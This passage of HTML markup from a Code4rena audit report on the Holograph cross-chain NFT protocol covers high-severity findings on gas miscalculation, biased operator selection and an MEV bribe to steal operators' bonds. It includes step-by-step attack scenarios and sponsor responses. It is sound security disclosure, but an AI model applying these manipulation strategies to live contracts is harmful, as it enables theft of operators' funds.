0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>An operator can’t execute any further jobs or leave the pod till the job is executed. From <a href=\"https://docs.holograph.xyz/holograph-protocol/operator-network-specification#:~:text=When%20an%20operator%20is%20selected%20for%20a%20job%2C%20they%20are%20temporarily%20removed%20from%20the%20pod%2C%20until%20they%20complete%20the%20job.%20If%20an%20operator%20successfully%20finalizes%20a%20job%2C%20they%20earn%20a%20reward%20and%20are%20placed%20back%20into%20their%20selected%20pod.\">the docs</a>:</li>\n</ul>\n<blockquote>\n<p>When an operator is selected for a job, they are temporarily removed from the pod, until they complete the job. If an operator successfully finalizes a job, they earn a reward and are placed back into their selected pod.</p>\n</blockquote>\n<ul>\n<li>Operator can’t skip a job. Can’t prove a negative but that’s pretty clear from reading the code.</li>\n<li>There’s indeed a third option - that some other operator/user would execute the job instead of the selected operator, but a) the operator would get slashed for that. b) If the compensation is lower than the gas fee then other users have no incentive to execute it as well.</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Allow operator to opt out of executing the job if the <code>gasPrice</code> is higher than the current gas price.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/364#issuecomment-1306348781\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Is a known issue, and we will be fixing it.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/364\">alexanderattar (Holograph) resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/84\">Feature/HOLO-604: implementing critical issue fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"h-03--layerzeromodule-miscalculates-gas-risking-loss-of-assets\" style=\"position:relative;\"><a href=\"#h-03--layerzeromodule-miscalculates-gas-risking-loss-of-assets\" aria-label=\"h 03  layerzeromodule miscalculates gas risking loss of assets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/445\">[H-03]  LayerZeroModule miscalculates gas, risking loss of assets</a></h2>\n<p><em>Submitted by Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L431-L445\">LayerZeroModule.sol#L431-L445</a><br></p>\n<p>Holograph gets its cross chain messaging primitives through Layer Zero. To get pricing estimate, it uses the DstConfig price struct exposed in LZ’s <a href=\"https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L133\">RelayerV2</a>.</p>\n<p>The issue is that the important baseGas and gasPerByte configuration parameters, which are used to calculate a custom amount of gas for the destination LZ message, use the values that come from the <em>source</em> chain. This is in contrast to LZ which handles DstConfigs in a mapping keyed by chainID.  The encoded gas amount is described <a href=\"https://layerzero.gitbook.io/docs/guides/advanced/relayer-adapter-parameters\">here</a>.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The impact is that when those fields are different between chains, one of two things may happen:</p>\n<ol>\n<li>Less severe - we waste excess gas, which is refunded to the lzReceive() caller (Layer Zero)</li>\n<li>More severe - we underprice the delivery cost, causing lzReceive() to revert and the NFT stuck in limbo forever.</li>\n</ol>\n<p>The code does not handle a failed lzReceive (differently to a failed executeJob). Therefore, no failure event is emitted and the NFT is screwed.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Firstly, make sure to use the target gas costs.<br>\nSecondly, re-engineer lzReceive to be fault-proof, i.e. save some gas to emit result event.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1297075073\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Might also cause the LZ channel to stuck <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/244\"><code>#244</code></a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308865449\">ACC01ADE (Holograph) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>I respectfully disagree that this is even a valid issue.<br>\n@Trust - please re-review the affected code. You’ll notice that we are in fact extracting destination chain gas data. And if you review the 100s of cross-chain testnet transactions that we have already made with that version of code, you will notice that the math is exact.</p>\n<p>Maybe I am misunderstanding something, so some clarification would be great if you think I’m wrong on this.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308879405\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Please take a look at <code>LayerZeroModule.sol</code>’s send function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function send(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256, /* gasLimit*/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256, /* gasPrice*/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint32 toChain,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  address msgSender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 msgValue,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bytes calldata crossChainPayload</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) external payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  require(msg.sender == address(_operator()), &quot;HOLOGRAPH: operator only call&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  LayerZeroOverrides lZEndpoint;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    lZEndpoint := sload(_lZEndpointSlot)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // need to recalculate the gas amounts for LZ to deliver message</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lZEndpoint.send{value: msgValue}(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint16(_interfaces().getChainId(ChainIdType.HOLOGRAPH, uint256(toChain), ChainIdType.LAYERZERO)),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    abi.encodePacked(address(this), address(this)),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    crossChainPayload,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    payable(msgSender),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    abi.encodePacked(uint16(1), uint256(_baseGas() + (crossChainPayload.length * _gasPerByte())))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The function uses <code>_baseGas()</code> and <code>_gasPerByte()</code> as the relayer adapter parameters as described in the submission description’s link. These two getters are global for all chains.</p>\n<p>I agree that the <code>getMessage()</code> function takes into account the correct fees for the destination chain.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308924550\">ACC01ADE (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>@Trust - Ya but these refer to destination gas limits. BaseGas and GasPerByte is the amount of gas that is used by the <code>crossChainMessage</code> function that LayerZero triggers on cross-chain call <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L484\">HolographOperator.sol#L484</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308953994\">ACC01ADE (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Discussed this in more detail with @Trust, definitely a critical issue.<br>\nNeed to add destination chain-specific <code>_baseGas</code> and <code>_gasPerByte</code> to mitigate EVM differences in opcode costs.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/445#event-7816582320\">alexanderattar (Holograph) resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/84\">Feature/HOLO-604: implementing critical issue fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"h-04-an-attacker-can-manipulate-each-pod-and-gain-an-advantage-over-the-remainder-operators\" style=\"position:relative;\"><a href=\"#h-04-an-attacker-can-manipulate-each-pod-and-gain-an-advantage-over-the-remainder-operators\" aria-label=\"h 04 an attacker can manipulate each pod and gain an advantage over the remainder operators permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/168\">[H-04] An attacker can manipulate each pod and gain an advantage over the remainder Operators</a></h2>\n<p><em>Submitted by eighty, also found by d3e4, eighty, Lambda, and eighty</em></p>\n<p>In <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539\">contracts/HolographOperator.sol#crossChainMessage</a>, each Operator is selected by:</p>\n<ul>\n<li>Generating a random number (<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499\">L499</a>)</li>\n<li>A pod is selected by dividing the random with the total number of pods, and using the remainder (<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L503\">L503</a>)</li>\n<li>An Operator of the selected pod is chosen using the <strong>same</strong> random and dividing by the total number of operators (<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L511\">L511</a>).</li>\n</ul>\n<p>This creates an unintended bias since the first criterion (the <code>random</code>) is used for both selecting the pod and selecting the Operator, as explained in a previous issue (<code>M001-Biased distribution</code>). In this case, an attacker knowing this flaw can continuously monitor the contracts state and see the current number of pods and Operators. Accordingly to the <a href=\"https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection\">documentation</a> and provided <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/docs/IMPORTANT_FLOWS.md#joining-pods\">flow</a>:</p>\n<ul>\n<li>An Operator can easily join and leave a pod, albeit when leaving a small fee is paid</li>\n<li>An Operator can only join one pod, but an attacker can control multiple Operators</li>\n<li>The attacker can then enter and leave a pod to increase (unfairly) his odds of being selected for a job</li>\n</ul>\n<p>Honest Operators may feel compelled to leave the protocol if there are no financial incentives (and lose funds in the process), which can also increase the odds of leaving the end-users at the hands of a malicious Operator.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider the following simulation for 10 pods with a varying number of operators follows (X → “does not apply”):</p>\n<table>\n<thead>\n<tr>\n<th>Pod n</th>\n<th>Pon len</th>\n<th>Op0</th>\n<th>Op1</th>\n<th>Op2</th>\n<th>Op3</th>\n<th>Op4</th>\n<th>Op5</th>\n<th>Op6</th>\n<th>Op7</th>\n<th>Op8</th>\n<th>Op9</th>\n<th>Total Pod</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>P0</td>\n<td>10</td>\n<td>615</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>615</td>\n</tr>\n<tr>\n<td>P1</td>\n<td>3</td>\n<td>203</td>\n<td>205</td>\n<td>207</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>615</td>\n</tr>\n<tr>\n<td>P2</td>\n<td>6</td>\n<td>208</td>\n<td>0</td>\n<td>233</td>\n<td>0</td>\n<td>207</td>\n<td>0</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>648</td>\n</tr>\n<tr>\n<td>P3</td>\n<td>9</td>\n<td>61</td>\n<td>62</td>\n<td>69</td>\n<td>70</td>\n<td>65</td>\n<td>69</td>\n<td>61</td>\n<td>60</td>\n<td>54</td>\n<td>X</td>\n<td>571</td>\n</tr>\n<tr>\n<td>P4</td>\n<td>4</td>\n<td>300</td>\n<td>0</td>\n<td>292</td>\n<td>0</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>592</td>\n</tr>\n<tr>\n<td>P5</td>\n<td>10</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>586</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>586</td>\n</tr>\n<tr>\n<td>P6</td>\n<td>2</td>\n<td>602</td>\n<td>0</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>602</td>\n</tr>\n<tr>\n<td>P7</td>\n<td>7</td>\n<td>93</td>\n<td>93</td>\n<td>100</td>\n<td>99</td>\n<td>76</td>\n<td>74</td>\n<td>78</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>613</td>\n</tr>\n<tr>\n<td>P8</td>\n<td>2</td>\n<td>586</td>\n<td>0</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>586</td>\n</tr>\n<tr>\n<td>P9</td>\n<td>6</td>\n<td>0</td>\n<td>190</td>\n<td>0</td>\n<td>189</td>\n<td>0</td>\n<td>192</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>571</td>\n</tr>\n</tbody>\n</table>\n<p>At this stage, an attacker Mallory joins the protocol and scans the protocol (or interacts with - e.g. <code>getTotalPods</code>, <code>getPodOperatorsLength</code>). As an example, after considering the potential benefits, she chooses pod <code>P9</code> and sets up some bots <code>[B1, B2, B3]</code>. The number of Operators will determine the odds, so:</p>\n<table>\n<thead>\n<tr>\n<th>Pod P9</th>\n<th>Alt len</th>\n<th>Op0</th>\n<th>Op1</th>\n<th>Op2</th>\n<th>Op3</th>\n<th>Op4</th>\n<th>Op5</th>\n<th>Op6</th>\n<th>Op7</th>\n<th>Op8</th>\n<th>Op9</th>\n<th>Total Pod</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>P9A</td>\n<td>4</td>\n<td>0</td>\n<td>276</td>\n<td>0</td>\n<td>295</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>571</td>\n</tr>\n<tr>\n<td>P9B</td>\n<td>5</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>571</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>571</td>\n</tr>\n<tr>\n<td>P9</td>\n<td>6</td>\n<td>0</td>\n<td>190</td>\n<td>0</td>\n<td>189</td>\n<td>0</td>\n<td>192</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>571</td>\n</tr>\n<tr>\n<td>P9C</td>\n<td>7</td>\n<td>66</td>\n<td>77</td>\n<td>81</td>\n<td>83</td>\n<td>87</td>\n<td>90</td>\n<td>87</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>571</td>\n</tr>\n<tr>\n<td>P9D</td>\n<td>8</td>\n<td>0</td>\n<td>127</td>\n<td>0</td>\n<td>147</td>\n<td>0</td>\n<td>149</td>\n<td>0</td>\n<td>148</td>\n<td>X</td>\n<td>X</td>\n<td>571</td>\n</tr>\n</tbody>\n</table>\n<p>And then:</p>\n<ol>\n<li>She waits for the next job to fall in <code>P9</code> and keeps an eye on the number of pods, since it could change the odds.</li>\n<li>After an Operator is selected (he <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L518\">pops</a> from the array), the number of available Operators change to 5, and the odds change to <code>P9B</code>.</li>\n<li>She deploys <code>B1</code> and it goes to position <code>Op5</code>, odds back to <code>P9</code>. If the meantime the previously chosen Operator comes back to the <code>pod</code>, see the alternative timeline.</li>\n<li>She now has 1/3 of the probability to be chosen for the next job:</li>\n</ol>\n<p>4.1 If she is not chosen, <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144\">she will assume the position</a> of the chosen Operator, and deploys <code>B2</code> to maintain the odds of <code>P9</code> and controls 2/3 of the pod.\n4.2 If she is chosen, she chooses between employing another bot or waiting to execute the job to back to the pod (keeping the original odds).\n5. She can then iterate multiple times to swap to the remainder of possible indexes via step 4.1.</p>\n<p>Alternative timeline (from previous 3.):</p>\n<ol>\n<li>The chosen Operator finishes the job and goes back to the pod. Now there’s 7 members with uniform odds (<code>P9C</code>).</li>\n<li>Mallory deploys <code>B2</code> and the length grows to 8, the odds turn to <code>P9D</code> and she now controls two of the four possible indexes from which she can be chosen.</li>\n</ol>\n<p>There are a lot of ramifications and possible outcomes that Mallory can manipulate to increase the odds of being selected in her favor.</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>As stated in <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/167\"><code>M001-Biased distribution</code></a>, use two random numbers for pod and Operator selection. Ideally, an independent source for randomness should be used, but following the assumption that the one used in <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499\">L499</a> is safe enough, using the most significant bits (e.g. <code>random >> 128</code>) should guarantee an unbiased distribution. Also, reading the <a href=\"https://eips.ethereum.org/EIPS/eip-4399\">EIP-4399</a> could be valuable.</p>\n<p>Additionally, since randomness in blockchain is always tricky to achieve without an oracle provider, consider adding additional controls (e.g. waiting times before joining each pod) to increase the difficulty of manipulating the protocol.</p>\n<p>And finally, in this particular case, removing the swapping mechanism (moving the last index to the chosen operator’s current index) for another mechanism (shifting could also create conflicts <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L358-L370\">with backup operators?</a>) could also increase the difficulty of manipulating a particular pod.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1296307048\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Considering this as duplicate of <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/169\"><code>#169</code></a> since they share the same root cause.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1308950227\">ACC01ADE (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Really love this analysis!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1320926135\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Judging this as high risk due to possible manipulation.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1321830898\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Agree this is a high severity find. Believe issue <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/167\"><code>#167</code></a> and this one are essentially different exploits of the same flaw and therefore should be bulked.<br>\nRelevant org discussion <a href=\"https://github.com/code-423n4/org/issues/8\">here</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1328123349\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Agreed.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-05-mev-operator-can-bribe-miner-and-steal-honest-operators-bond-amount-if-gas-price-went-high\" style=\"position:relative;\"><a href=\"#h-05-mev-operator-can-bribe-miner-and-steal-honest-operators-bond-amount-if-gas-price-went-high\" aria-label=\"h 05 mev operator can bribe miner and steal honest operators bond amount if gas price went high permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/473\">[H-05] MEV: Operator can bribe miner and steal honest operator’s bond amount if gas price went high</a></h2>\n<p><em>Submitted by Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354\">HolographOperator.sol#L354</a><br></p>\n<p>Operators in Holograph do their job by calling executeJob() with the bridged in bytes from source chain.<br>\nIf the primary job operator did not execute the job during his allocated block slot, he is punished by taking a single bond amount and transfer it to the operator doing it instead.<br>\nThe docs and code state that if there was a gas spike in the operator’s slot, he shall not be punished. The way a gas spike is checked is with this code in executeJob:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">require(gasPrice &gt;= tx.gasprice, &quot;HOLOGRAPH: gas spike detected&quot;);</span></span></code></pre>\n<p>However, there is still a way for operator to claim primary operator’s bond amount although gas price is high. Attacker can submit a flashbots bundle including the executeJob() transaction, and one additional “bribe” transaction. The bribe transaction will transfer some incentive amount to coinbase address (miner), while the executeJob is submitted with a low gasprice. Miner will accept this bundle as it is overall rewarding enough for them, and attacker will receive the base bond amount from victim operator. This threat is not theoretical because every block we see MEV bots squeezing value from such opportunities.</p>\n<p>info about coinbase <a href=\"https://docs.flashbots.net/flashbots-auction/searchers/advanced/coinbase-payment\">transfer</a><br>\ninfo about bundle <a href=\"https://docs.flashbots.net/flashbots-auction/searchers/advanced/bundle-pricing#bundle-ordering-formula\">selection</a></p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Dishonest operator can take honest operator’s bond amount although gas price is above acceptable limits.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path 